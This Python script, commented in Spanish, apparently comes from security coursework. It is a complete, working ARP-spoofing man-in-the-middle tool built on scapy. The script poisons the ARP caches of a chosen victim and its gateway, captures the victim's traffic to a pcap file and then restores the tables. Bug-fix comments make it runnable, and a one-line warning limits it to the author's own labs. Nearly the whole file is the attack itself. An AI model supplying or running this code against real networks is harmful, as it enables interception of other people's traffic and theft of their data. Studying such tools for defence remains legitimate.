"""
arper.py - ARP Poisoning (Man-in-the-Middle) con scapy
=======================================================
Realiza un ataque ARP Spoofing entre una víctima y su gateway:
  1. Envenena la caché ARP de la víctima haciéndose pasar por el gateway.
  2. Envenena la caché ARP del gateway haciéndose pasar por la víctima.
  3. Snifea el tráfico entre ambos y lo guarda en arper.pcap.
  4. Restaura las tablas ARP al terminar (Ctrl+C).

ADVERTENCIA: Solo usar en entornos de lab propios con permiso explícito.

REQUISITOS:
    pip install scapy
    Ejecutar con root / administrador. En Linux: sysctl -w net.ipv4.ip_forward=1

EJEMPLOS DE EJECUCIÓN:
    sudo python arper.py 192.168.1.50 192.168.1.1 eth0
    #  └─ víctima        └─ gateway      └─ interfaz
    # Captura 200 paquetes y termina restaurando ARP.
"""

from multiprocessing import Process   # FIX: era `process` (minúscula)

from scapy.all import (ARP, Ether, conf, get_if_hwaddr,
                       send, sniff, srp, wrpcap)

import sys
import time


def get_mac(target_ip: str) -> str:
    """
    Resuelve la MAC de una IP enviando una petición ARP broadcast.

    Args:
        target_ip (str): IP cuya MAC se quiere obtener.
    Returns:
        str: Dirección MAC o None si no responde.
    """
    packet = Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(op="who-has", pdst=target_ip)
    resp, _ = srp(packet, timeout=2, retry=10, verbose=False)
    for _, r in resp:
        return r[Ether].src
    return None


class Arper:
    """Gestor del ataque ARP Poisoning."""

    def __init__(self, victim: str, gateway: str, interface: str = 'eth0'):
        self.victim     = victim
        self.victimmac  = get_mac(victim)
        self.gateway    = gateway
        self.gatewaymac = get_mac(gateway)
        self.interface  = interface

        conf.iface = interface
        conf.verb  = 0

        print(f'Initialized {interface}:')
        print(f'  Gateway ({gateway}) is at {self.gatewaymac}.')
        print(f'  Victim  ({victim})  is at {self.victimmac}.')
        print('-' * 30)

    def run(self):
        """Lanza los hilos de envenenamiento y sniffing en paralelo."""
        # FIX: se usan dos atributos separados para no sobreescribir el primero
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)  # FIX: variable propia
        self.sniff_thread.start()

    def poison(self):
        """Envía paquetes ARP falsos en bucle a víctima y gateway."""
        poison_victim = ARP(
            op=2, psrc=self.gateway, pdst=self.victim, hwdst=self.victimmac
        )
        poison_gateway = ARP(
            op=2, psrc=self.victim, pdst=self.gateway, hwdst=self.gatewaymac
        )

        print(f'[Poison] ip src victim : {poison_victim.psrc}')
        print(f'[Poison] ip dst victim : {poison_victim.pdst}')
        print(f'[Poison] mac dst victim: {poison_victim.hwdst}')
        print(f'[Poison] mac src victim: {poison_victim.hwsrc}')
        print(poison_victim.summary())
        print('-' * 30)   # FIX: era `print(''*30)` que imprimía cadena vacía

        print(f'[Poison] ip src gateway : {poison_gateway.psrc}')
        print(f'[Poison] ip dst gateway : {poison_gateway.pdst}')
        print(f'[Poison] mac dst gateway: {poison_gateway.hwdst}')
        print(f'[Poison] mac src gateway: {poison_gateway.hwsrc}')
        print(poison_gateway.summary())
        print('-' * 30)

        print('[*] ARP poison running. Press Ctrl+C to stop.')
        while True:
            sys.stdout.write('.')
            sys.stdout.flush()
            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                sys.exit()
            else:
                time.sleep(2)

    def sniff(self, count: int = 200):
        """
        Captura tráfico entre víctima y gateway y lo guarda en PCAP.

        Args:
            count (int): Número de paquetes a capturar antes de terminar.
        """
        time.sleep(5)
        print(f'\n[*] Sniffing {count} packets…')
        # FIX: era `victim` (variable no definida) → `self.victim`
        bpf_filter = f"ip host {self.victim}"
        packets = sniff(count=count, filter=bpf_filter, iface=self.interface)
        wrpcap('arper.pcap', packets)
        print('[*] Packets saved to arper.pcap')
        self.restore()
        self.poison_thread.terminate()
        print('[*] Finished.')

    def restore(self):
        """Restaura las tablas ARP reales en víctima y gateway."""
        print('\n[*] Restoring ARP tables…')
        send(ARP(
            op=2, psrc=self.gateway, hwsrc=self.gatewaymac,
            pdst=self.victim, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
        send(ARP(
            op=2, psrc=self.victim, hwsrc=self.victimmac,
            pdst=self.gateway, hwdst='ff:ff:ff:ff:ff:ff'), count=5)


if __name__ == '__main__':
    if len(sys.argv) != 4:
        print("Uso: python arper.py <víctima> <gateway> <interfaz>")
        print("Ej : python arper.py 192.168.1.50 192.168.1.1 eth0")
        sys.exit(1)
    victim, gateway, interface = sys.argv[1], sys.argv[2], sys.argv[3]
    myarp = Arper(victim, gateway, interface)
    myarp.run()
